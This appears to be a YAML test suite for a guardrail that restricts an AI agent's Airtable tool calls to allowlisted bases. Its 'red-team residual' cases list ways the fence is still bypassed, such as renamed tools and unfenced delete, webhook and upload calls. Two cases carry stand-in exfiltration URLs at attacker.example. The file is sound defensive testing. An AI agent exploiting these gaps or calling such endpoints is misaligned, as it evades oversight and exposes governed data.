@@ -1,0 +1,607 @@
+# Tests for airtable/fence-base-allowlist.
+# Covers: discovery pass-through (ping/list_bases/search_bases/list_workspaces),
+# allowlisted base allow (official + community spellings, reads + writes + schema),
+# non-allowlisted base deny, fail-closed missing/misplaced baseId, case-insensitive
+# tool matching, and documented residuals (delete_records, list_tables_for_base,
+# get_table_schema, create_base not fenced).
+
+# --- Discovery tools carry no baseId -> allowed ---
+
+- description: Discovery tool list_bases carries no baseId and passes through.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_bases
+      uri: null
+    payload:
+      name: airtable-list_bases
+      args: {}
+  output:
+    expectedResult: allow
+
+- description: Discovery tool ping passes through.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-ping
+      uri: null
+    payload:
+      name: airtable-ping
+      args: {}
+  output:
+    expectedResult: allow
+
+- description: Discovery tool search_bases passes through (name contains no record stem).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-search_bases
+      uri: null
+    payload:
+      name: airtable-search_bases
+      args:
+        searchTerm: crm
+  output:
+    expectedResult: allow
+
+- description: Discovery tool list_workspaces passes through.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_workspaces
+      uri: null
+    payload:
+      name: airtable-list_workspaces
+      args: {}
+  output:
+    expectedResult: allow
+
+# --- Allowlisted base -> allowed (reads, writes, schema; both spellings) ---
+
+- description: Official list_records_for_table on an allowlisted base is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records_for_table
+      uri: null
+    payload:
+      name: airtable-list_records_for_table
+      args:
+        baseId: appEXAMPLEBASE0001
+        tableId: tbl123
+  output:
+    expectedResult: allow
+
+- description: Community terse list_records on the second allowlisted base is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records
+      uri: null
+    payload:
+      name: airtable-list_records
+      args:
+        baseId: appEXAMPLEBASE0002
+        tableId: tbl999
+  output:
+    expectedResult: allow
+
+- description: Page-read get_record_for_page on an allowlisted base is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-get_record_for_page
+      uri: null
+    payload:
+      name: airtable-get_record_for_page
+      args:
+        baseId: appEXAMPLEBASE0001
+        pageId: pag1
+        recordId: rec1
+  output:
+    expectedResult: allow
+
+- description: Write create_records_for_table on an allowlisted base is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_records_for_table
+      uri: null
+    payload:
+      name: airtable-create_records_for_table
+      args:
+        baseId: appEXAMPLEBASE0001
+        tableId: tbl123
+        records:
+          - fields:
+              Name: Acme
+  output:
+    expectedResult: allow
+
+- description: Schema write create_field on an allowlisted base is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_field
+      uri: null
+    payload:
+      name: airtable-create_field
+      args:
+        baseId: appEXAMPLEBASE0002
+        tableId: tbl999
+        name: Status
+        type: singleSelect
+  output:
+    expectedResult: allow
+
+# --- Non-allowlisted base -> denied (each rule branch / tool class) ---
+
+- description: Official list_records_for_table on a NON-allowlisted base is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records_for_table
+      uri: null
+    payload:
+      name: airtable-list_records_for_table
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: Community terse list_records on a NON-allowlisted base is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records
+      uri: null
+    payload:
+      name: airtable-list_records
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: search_records on a NON-allowlisted base is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-search_records
+      uri: null
+    payload:
+      name: airtable-search_records
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+        searchTerm: salary
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: Page-read list_records_for_page on a NON-allowlisted base is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records_for_page
+      uri: null
+    payload:
+      name: airtable-list_records_for_page
+      args:
+        baseId: appUNSANCTIONED99
+        pageId: pag1
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: Write update_records_for_table on a NON-allowlisted base is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-update_records_for_table
+      uri: null
+    payload:
+      name: airtable-update_records_for_table
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+        records:
+          - id: rec1
+            fields:
+              Name: Changed
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: Schema write create_table on a NON-allowlisted base is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_table
+      uri: null
+    payload:
+      name: airtable-create_table
+      args:
+        baseId: appUNSANCTIONED99
+        name: NewTable
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: Schema write update_field on a NON-allowlisted base is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-update_field
+      uri: null
+    payload:
+      name: airtable-update_field
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+        fieldId: fld1
+        name: Renamed
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: Schema write update_table on a NON-allowlisted base is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-update_table
+      uri: null
+    payload:
+      name: airtable-update_table
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+        name: Renamed
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+# --- Fail-closed branch: base-scoped tool with no usable baseId ---
+
+- description: Fail closed — base-scoped tool with empty args (no baseId) is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records_for_table
+      uri: null
+    payload:
+      name: airtable-list_records_for_table
+      args: {}
+  output:
+    expectedResult: deny
+    expectedReason: This Airtable tool operates on a specific base but no baseId was supplied, so it cannot be matched against the sanctioned-base allowlist. Re-issue the call naming an allowlisted base, and request base onboarding through your data-governance owner if the base you need is not yet allowlisted.
+
+- description: Red-team — baseId supplied under a wrong key (base_id) is not seen, so it fails closed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-update_records_for_table
+      uri: null
+    payload:
+      name: airtable-update_records_for_table
+      args:
+        base_id: appEXAMPLEBASE0001
+        tableId: tbl123
+  output:
+    expectedResult: deny
+    expectedReason: This Airtable tool operates on a specific base but no baseId was supplied, so it cannot be matched against the sanctioned-base allowlist. Re-issue the call naming an allowlisted base, and request base onboarding through your data-governance owner if the base you need is not yet allowlisted.
+
+# --- Fail closed when the payload is absent entirely (missing-args red-team) ---
+
+- description: Fail closed — base-scoped tool with NO payload key at all resolves baseId to "" and is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records_for_table
+      uri: null
+  output:
+    expectedResult: deny
+    expectedReason: This Airtable tool operates on a specific base but no baseId was supplied, so it cannot be matched against the sanctioned-base allowlist. Re-issue the call naming an allowlisted base, and request base onboarding through your data-governance owner if the base you need is not yet allowlisted.
+
+# --- Red-team (documented residual): alternate word separators are NOT matched ---
+# Stems are underscore-delimited; a hyphen- or camelCase-spelled record tool falls through
+# the non-base-scoped allow branch and reaches a non-allowlisted base. Not exploitable against
+# the two verified (snake_case) servers; documented under Known limitations as a portability gap.
+
+- description: Red-team (documented residual) — hyphen-delimited list-records-for-table is not matched by the underscore stems, so it passes through even on a NON-allowlisted base.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list-records-for-table
+      uri: null
+    payload:
+      name: airtable-list-records-for-table
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+  output:
+    expectedResult: allow
+
+- description: Red-team (documented residual) — camelCase listRecords is not matched by the underscore stems, so it passes through even on a NON-allowlisted base.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-listRecords
+      uri: null
+    payload:
+      name: airtable-listRecords
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+  output:
+    expectedResult: allow
+
+# --- Case-insensitive tool matching / gateway prefix variance ---
+
+- description: Case-insensitive match — mixed-case tool name on a NON-allowlisted base is still denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: Airtable-MCP-List_Records_For_Table
+      uri: null
+    payload:
+      name: Airtable-MCP-List_Records_For_Table
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: Base IDs are case-sensitive — an allowlisted ID with altered casing is NOT allowlisted and is denied.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_records_for_table
+      uri: null
+    payload:
+      name: airtable-list_records_for_table
+      args:
+        baseId: appexamplebase0001
+        tableId: tbl123
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appexamplebase0001 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+# --- Red-team: display_records_for_table is a record reader and must be fenced ---
+
+- description: Red-team (fixed) — official display_records_for_table on a NON-allowlisted base is denied (reads records).
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-display_records_for_table
+      uri: null
+    payload:
+      name: airtable-display_records_for_table
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+  output:
+    expectedResult: deny
+    expectedReason: Airtable base appUNSANCTIONED99 is not on the sanctioned-base allowlist, so the agent may not operate on it. Request base onboarding through your data-governance owner, or contact them if you believe this base is already governed.
+
+- description: display_records_for_table on an allowlisted base is allowed.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-display_records_for_table
+      uri: null
+    payload:
+      name: airtable-display_records_for_table
+      args:
+        baseId: appEXAMPLEBASE0001
+        tableId: tbl123
+  output:
+    expectedResult: allow
+
+# --- Documented residuals: baseId-carrying tools NOT in the enumerated set ---
+
+- description: Red-team (documented residual) — create_comment carries a baseId but is not in the enumerated set, so it passes through.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_comment
+      uri: null
+    payload:
+      name: airtable-create_comment
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+        recordId: rec1
+        text: note
+  output:
+    expectedResult: allow
+
+- description: Red-team (documented residual) — community delete_records is NOT fenced; relies on the freeze-destructive-ops companion.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-delete_records
+      uri: null
+    payload:
+      name: airtable-delete_records
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+        recordIds:
+          - rec1
+  output:
+    expectedResult: allow
+
+- description: Red-team (documented residual) — list_tables_for_base carries a baseId but is not in the enumerated set, so it passes through.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-list_tables_for_base
+      uri: null
+    payload:
+      name: airtable-list_tables_for_base
+      args:
+        baseId: appUNSANCTIONED99
+  output:
+    expectedResult: allow
+
+- description: Red-team (documented residual) — get_table_schema (metadata reader) is not fenced.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-get_table_schema
+      uri: null
+    payload:
+      name: airtable-get_table_schema
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+  output:
+    expectedResult: allow
+
+- description: Red-team (documented residual) — a per-base webhook tool carries a baseId but its name has no enumerated stem, so it passes through (persistent-exfil residual; illustrative unverified rashidazarang name). Deny with an escape-hatch companion.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_webhook
+      uri: null
+    payload:
+      name: airtable-create_webhook
+      args:
+        baseId: appUNSANCTIONED99
+        notificationUrl: https://attacker.example/hook
+  output:
+    expectedResult: allow
+
+- description: Red-team (documented residual) — create_base names a workspaceId (no baseId) and is not fenced here.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-create_base
+      uri: null
+    payload:
+      name: airtable-create_base
+      args:
+        workspaceId: wsp1
+        name: New Base
+  output:
+    expectedResult: allow
+
+- description: Red-team (documented residual) — official upload_attachment is a base-scoped write (pushes file content into a record on a specific base and triggers an Airtable-side fetch of the supplied URL) but its name contains no enumerated stem, so it passes through even on a NON-allowlisted base. Deny with the schema-freeze / no-external-exposure companion.
+  input:
+    action: tool_pre_invoke
+    kind: tool_pre_invoke
+    mode: input
+    resource:
+      type: tool
+      name: airtable-upload_attachment
+      uri: null
+    payload:
+      name: airtable-upload_attachment
+      args:
+        baseId: appUNSANCTIONED99
+        tableId: tbl123
+        recordId: rec1
+        url: https://attacker.example/payload.bin
+  output:
+    expectedResult: allow
